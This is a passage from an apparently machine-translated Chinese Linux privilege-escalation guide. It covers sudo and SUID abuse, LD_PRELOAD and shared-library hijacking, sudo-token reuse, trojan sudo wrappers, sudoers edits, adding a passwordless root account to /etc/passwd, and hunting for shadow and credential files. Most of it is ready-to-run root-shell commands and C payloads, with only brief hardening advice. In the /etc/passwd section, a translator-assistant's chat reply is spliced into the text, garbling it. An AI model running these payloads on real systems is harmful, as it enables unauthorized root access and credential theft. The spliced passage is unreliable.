lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大 UID

某些 Linux 版本受到一个漏洞的影响，允许 **UID > INT_MAX** 的用户提升权限。更多信息： [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### 组

检查你是否为某些可能授予你 root 权限的组的成员：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 剪贴板

检查剪贴板中是否有任何有趣的内容（如果可能）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你**知道环境中的任何密码**，**尝试使用该密码登录每个用户**。

### Su Brute

如果你不介意产生大量噪音，并且目标机器上存在 `su` 和 `timeout` 二进制文件，你可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce)。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数也会尝试对用户进行暴力破解。

## 可写 $PATH 滥用

### $PATH

如果你发现可以**在 $PATH 的某个文件夹中写入**，你可能能够通过**在该可写文件夹中创建一个名为某个将由其他用户（理想情况下是 root）执行的命令的 backdoor**来提权，前提是该命令**不会从位于你的可写文件夹之前的 $PATH 文件夹加载**。

### SUDO and SUID

你可能被允许使用 sudo 执行某些命令，或者某些命令可能设置了 suid 位。使用以下命令检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
有些 **意外的命令允许你读取和/或写入文件，甚至执行命令。** 例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许某个用户在无需知道密码的情况下，以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个例子中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在通过将 ssh key 添加到 root 目录或调用 `sh` 就能轻松获得 shell。
```
sudo vim -c '!sh'
```
### SETENV

该指令允许用户在执行某些操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
此示例，**基于 HTB machine Admirer**，**易受攻击**，可被 **PYTHONPATH hijacking** 利用，从而在以 root 身份执行脚本时加载任意 python 库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV 通过 sudo env_keep 保留 → root shell

如果 sudoers 保留了 `BASH_ENV`（例如 `Defaults env_keep+="ENV BASH_ENV"`），当调用被允许的命令时，你可以利用 Bash 的非交互启动行为来以 root 身份运行任意代码。

- Why it works: 对于非交互 shell，Bash 会评估 `$BASH_ENV` 并在运行目标脚本之前 source（加载）该文件。许多 sudo 规则允许运行脚本或 shell 包装器。如果 sudo 保留了 `BASH_ENV`，你的文件将以 root 权限被 source。

- Requirements:
- 你能运行的 sudo 规则（任何以非交互方式调用 `/bin/bash` 的目标，或任何 bash 脚本）。
- `BASH_ENV` 存在于 `env_keep` 中（使用 `sudo -l` 检查）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 硬化:
- 从 `env_keep` 中移除 `BASH_ENV`（和 `ENV`），优先使用 `env_reset`。
- 避免为允许 sudo 的命令使用 shell wrapper；使用尽可能精简的二进制程序。
- 当使用被保留的环境变量时，考虑对 sudo 的 I/O 进行日志记录和告警。

### Terraform 通过 sudo 且保留 HOME (!env_reset)

如果 sudo 在允许 `terraform apply` 的同时保持环境不变（`!env_reset`），那么 `$HOME` 将保留为调用用户。Terraform 因此会以 root 身份加载 **$HOME/.terraformrc** 并遵从 `provider_installation.dev_overrides`。

- 将所需 provider 指向一个可写目录，并放置一个以该 provider 命名的恶意插件（例如，`terraform-provider-examples`）：
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform 会在 Go plugin handshake 失败，但在终止前以 root 身份执行 payload，留下一个 SUID shell。

### TF_VAR 覆盖 + symlink 验证 绕过

Terraform 的变量可以通过 `TF_VAR_<name>` 环境变量提供，当 sudo 保留环境时这些变量会被保留。诸如 `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` 之类的弱验证可以通过 symlinks 绕过：
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform resolves the symlink and copies the real `/root/root.txt` into an attacker-readable destination. The same approach can be used to **写入** into privileged paths by pre-creating destination symlinks (e.g., pointing the provider’s destination path inside `/etc/cron.d/`).

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.

- Requirements: a sudo rule (often `NOPASSWD`) running a script/binary that calls commands without absolute paths (`free`, `df`, `ps`, etc.) and a writable PATH entry that is searched first.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 执行路径绕过
**跳转** 去读取其他文件或使用 **symlinks**。例如在 sudoers 文件中： _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **wildcard** (\*)，会更容易：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary 无指定命令路径

如果将 **sudo permission** 授予单个命令且 **未指定路径**： _hacker10 ALL= (root) less_，你可以通过更改 PATH 变量 利用它
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
如果一个 **suid** 二进制 **在执行另一个命令时没有指定该命令的路径（始终使用** _**strings**_ **检查可疑 SUID 二进制的内容）**，则也可以使用此技术。

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary 带命令路径

如果 **suid** 二进制 **执行另一个命令并指定了路径**，那么你可以尝试**导出一个函数**，其名称与 suid 文件所调用的命令相同。

例如，如果 suid 二进制调用了 _**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并导出它：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用 suid 二进制文件时，这个函数将被执行

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 环境变量用于指定一个或多个共享库 (.so 文件)，在其他库之前由加载器加载，包括标准 C 库 (`libc.so`)。这个过程称为预加载库。

但是，为了维护系统安全并防止该特性被滥用，特别是在 **suid/sgid** 可执行文件上，系统实施了若干限制：

- 当可执行文件的真实用户 ID (_ruid_) 与有效用户 ID (_euid_) 不匹配时，加载器会忽略 **LD_PRELOAD**。
- 对于带有 suid/sgid 的可执行文件，只有位于标准路径且同样具有 suid/sgid 的库会被预加载。

如果你有使用 `sudo` 执行命令的权限，并且 `sudo -l` 的输出中包含 **env_keep+=LD_PRELOAD**，则可能发生权限提升。该配置允许 **LD_PRELOAD** 环境变量在使用 `sudo` 运行命令时被保留并生效，从而可能导致以更高特权执行任意代码。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令**编译它**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，**escalate privileges** 正在运行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制了 **LD_LIBRARY_PATH** env variable，就可以滥用类似的 privesc，因为他控制了库搜索的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

遇到具有 **SUID** 权限且看起来异常的 binary 时，建议验证其是否正确加载 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到类似错误 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 表明存在可被利用的可能性。

要利用这一点，可以通过创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，其内容如下：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
该代码在编译并执行后，旨在通过修改文件权限并执行具有 elevated privileges 的 shell 来实现 elevate privileges。

将上述 C 文件编译为 shared object (.so) 文件，使用：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID 二进制文件应该会触发漏洞利用，从而可能导致系统被攻陷。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
既然我们已经发现一个 SUID binary 会从我们可以写入的 folder 加载 library，就在该 folder 中用必要的名称创建该 library：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果出现如下错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的库需要有一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个整理的 Unix 二进制文件列表，攻击者可以利用这些二进制文件绕过本地安全限制。 [**GTFOArgs**](https://gtfoargs.github.io/) 则用于只能在命令中注入参数的情况。

该项目收集了 Unix 二进制文件的合法功能，这些功能可被滥用以突破受限 shells、提升或维持提权、传输文件、生成 bind 和 reverse shells，并便利其他 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你能访问 `sudo -l`，可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 来检查它是否能找到利用任意 sudo 规则的方法。

### Reusing Sudo Tokens

在你有 **sudo access** 但不知道密码的情况下，你可以通过 **waiting for a sudo command execution and then hijacking the session token** 来提升权限。

Requirements to escalate privileges:

- 你已经有一个以用户 _sampleuser_ 的 shell
- _sampleuser_ 已经 **used `sudo`** 在 **last 15mins** 内执行过某些命令（默认这是 sudo token 的时长，允许我们在不输入密码的情况下使用 `sudo`）
- `cat /proc/sys/kernel/yama/ptrace_scope` 的值为 0
- `gdb` 可访问（你应该能够上传它）

(你可以临时通过 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 启用 ptrace_scope，或永久修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0`)

如果满足以上所有条件，**你可以使用以下方法提升权限：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) 会在 _/tmp_ 下创建二进制文件 `activate_sudo_token`。你可以用它来 **activate the sudo token in your session**（不会自动获得 root shell，请执行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- 第二个 **exploit** (`exploit_v2.sh`) 会在 _/tmp_ 创建一个由 root 拥有并带有 setuid 的 sh shell
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- 第 **third exploit** (`exploit_v3.sh`) 会 **创建 sudoers file**，使 **sudo tokens 永久有效并允许所有用户使用 sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你对该文件夹或其内任意已创建的文件拥有 **write permissions**，你可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来 **create a sudo token for a user and PID**。\
例如，若你能覆盖文件 _/var/run/sudo/ts/sampleuser_，并且以该用户身份且 PID 为 1234 拥有一个 shell，你可以在不需要知道密码的情况下通过下列方式 **obtain sudo privileges**：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 和 `/etc/sudoers.d` 中的文件配置谁可以使用 `sudo` 以及如何使用。这些文件 **默认只能由用户 root 和组 root 读取**。\
**如果** 你能 **读取** 该文件，你可能能够 **获取一些有趣的信息**，并且如果你能 **写入** 任意文件，你将能够 **提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你有写权限，就可以滥用此权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
滥用这些权限的另一种方式：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些 `sudo` 二进制的替代品，例如 OpenBSD 的 `doas`，请记得检查其配置，位于 `/etc/doas.conf`。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道一个**用户通常连接到一台机器并使用 `sudo`** 来提权，并且你在该用户上下文中得到了一个 shell，你可以**创建一个新的 sudo 可执行文件**，该文件会以 root 身份先执行你的代码，然后再执行用户的命令。然后，**修改该用户上下文的 $PATH**（例如在 .bash_profile 中添加新的路径），这样当用户执行 sudo 时，就会运行你的 sudo 可执行文件。

注意，如果用户使用不同的 shell（不是 bash），你需要修改其它文件来添加新的路径。例如[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 修改 `~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 找到另一个示例。

或者运行类似如下的命令：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

这意味着会读取来自 `/etc/ld.so.conf.d/*.conf` 的配置文件。这些配置文件**指向其他文件夹**，系统会在这些文件夹中**查找****库**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统会在 `/usr/local/lib` 中搜索库**

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将 lib 复制到 `/var/tmp/flag15/`，它将按 `RPATH` 变量中指定的位置被程序使用。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 中创建一个恶意库，使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
阅读下列页面以**了解更多关于 capabilities 以及如何滥用它们**：


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

在目录中，表示 **"execute"** 的位意味着受影响的用户可以 **"cd"** 进入该文件夹。\
表示 **"read"** 的位意味着用户可以 **列出** **文件**，而表示 **"write"** 的位意味着用户可以 **删除** 和 **创建** 新的 **文件**。

## ACLs

Access Control Lists (ACLs) 表示可自由裁量权限的第二层，能够**覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝非所有者或不属于组的特定用户的访问权，增强了对文件或目录访问的控制。此级别的**粒度确保更精确的访问管理**。更多细节请见 [**这里**](https://linuxconfig.org/how-to-manage-acls-on-linux)。

**给** 用户 "kali" 赋予对文件的读写权限：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取** 系统中具有特定 ACLs 的文件：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开 shell sessions

在 **旧版本** 中，你可能可以 **hijack** 某个不同用户（**root**）的 **shell** session。\
在 **最新版本** 中，你只能 **connect** 到 **your own user** 的 screen sessions。然而，你仍可能在 session 内找到 **有趣的信息**。

### screen sessions hijacking

**列出 screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux 会话劫持

这是 **旧的 tmux 版本** 的一个问题。  
作为非特权用户，我无法劫持由 root 创建的 tmux (v2.1) 会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
查看 **Valentine box from HTB** 作为示例。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月到2008年5月13日期间在基于 Debian 的系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥可能受此漏洞影响。\
此漏洞在这些操作系统创建新的 ssh 密钥时发生，原因是 **只有 32,768 种可能性**。这意味着可以计算出所有可能的密钥，并且 **通过已有的 ssh 公钥可以搜索到对应的私钥**。你可以在此找到已计算出的可能性：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH 重要的配置项

- **PasswordAuthentication:** 指定是否允许密码认证。默认值为 `no`。
- **PubkeyAuthentication:** 指定是否允许公钥认证。默认值为 `yes`。
- **PermitEmptyPasswords**: 当允许密码认证时，指定服务器是否允许使用空密码字符串的账户登录。默认值为 `no`。

### PermitRootLogin

指定是否允许 root 使用 ssh 登录，默认值为 `no`。可能的取值：

- `yes`: root 可以使用密码或私钥登录
- `without-password` or `prohibit-password`: root 只能使用私钥登录
- `forced-commands-only`: root 仅能使用私钥登录，且必须指定 commands 选项
- `no` : 不允许

### AuthorizedKeysFile

指定包含可用于用户认证的公钥的文件。它可以包含像 `%h` 这样的占位符，该占位符会被替换为用户的主目录。**你可以指定绝对路径**（以 `/` 开头），或 **相对于用户主目录的相对路径**。例如：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置表示，如果你尝试使用用户 "**testusername**" 的 **private** key 登录，ssh 会将你 key 的 public key 与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 的条目进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **use your local SSH keys instead of leaving keys**（不要把没有 passphrases 的 keys 放在你的 server 上！）。因此，你可以通过 ssh **jump** **to a host**，然后从该 host 再 **jump to another** host，**using** 存放在你 **initial host** 的 **key**。

你需要在 `$HOME/.ssh.config` 中设置此选项，如下：
```
Host example.com
ForwardAgent yes
```
注意，如果 `Host` 是 `*`，每次用户跳到不同机器时，该 host 都能访问 keys（这是一个安全问题）。

文件 `/etc/ssh_config` 可以 **覆盖** 这些 **选项** 并允许或拒绝此配置。\
文件 `/etc/sshd_config` 可以使用关键字 `AllowAgentForwarding` **允许** 或 **拒绝** ssh-agent 转发（默认允许）。

如果你发现 Forward Agent 在某环境中已配置，请阅读下面的页面，因为 **你可能能够滥用它以提升权限**：


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### 配置文件

文件 `/etc/profile` 以及 `/etc/profile.d/` 下的文件是 **当用户运行新的 shell 时执行的脚本**。因此，如果你能够 **写入或修改其中任何一个，你就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何异常的 profile 脚本，应该检查其中的**敏感信息**。

### Passwd/Shadow 文件

根据操作系统，`/etc/passwd` 和 ` /etc/shadow` 文件可能使用不同的名称或存在备份。因此建议**找到所有这些文件**并**检查是否可以读取**它们，以查看**文件中是否包含哈希值**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd`（或等效文件）中找到 **password hashes**。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用以下任一命令生成一个 password。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
我需要你先提供 src/linux-hardening/privilege-escalation/README.md 的内容（把文件内容粘贴到这里）。我会把其中的英文翻译成中文，严格保留原有的 Markdown/HTML 标签、路径和代码块不翻译。

关于你说的 “Then add the user `hacker` and add the generated password.”：
- 我无法在你的系统上实际创建用户或执行命令，但可以在翻译后的 README 中追加示例命令来创建用户并设置密码，并为你生成一个示例密码。
- 请确认以下选项：
  1. 密码长度和复杂度要求（例如：12 个字符，包含大写、小写、数字、特殊字符）。
  2. 是否要以明文显示密码，还是只在文件中给出命令示例并说明如何生成/设置密码（或给出密码的 hash）。
  3. 你偏好使用的命令：useradd + chpasswd、adduser、或其他（例如在 Debian/Ubuntu 通常用 adduser，在 RHEL/CentOS 常用 useradd）。

确认后，我会：
- 翻译 README（保留所有代码、路径和标签不变），
- 在合适位置追加用于创建用户 `hacker` 的命令示例，并插入生成的示例密码（或按你要求的方式处理）。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如： `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在你可以使用 `su` 命令，以 `hacker:hacker` 登录

或者，你可以使用以下行添加一个无密码的虚拟用户。\
警告：这可能会降低机器当前的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台上，`/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，并且 `/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以**在某些敏感文件中写入**。例如，你能否写入某些**服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行一个 **tomcat** 服务器，并且你可以 **modify the Tomcat service configuration file inside /etc/systemd/,** 那么你可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### 检查文件夹

以下文件夹可能包含备份或有趣的信息：**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (可能你无法读取最后一个，但可以尝试)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/Owned 文件
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟内修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的脚本/二进制文件**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
